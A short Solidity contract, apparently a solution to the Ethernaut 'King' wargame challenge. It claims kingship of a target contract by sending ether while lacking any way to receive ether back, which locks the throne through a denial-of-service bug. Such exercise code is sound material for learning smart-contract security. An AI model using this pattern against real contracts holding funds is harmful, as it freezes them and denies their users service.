// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HackKing {
    function hack(address _kingAddr) external payable {
        (bool success, ) = _kingAddr.call{value: msg.value}("");
    }
}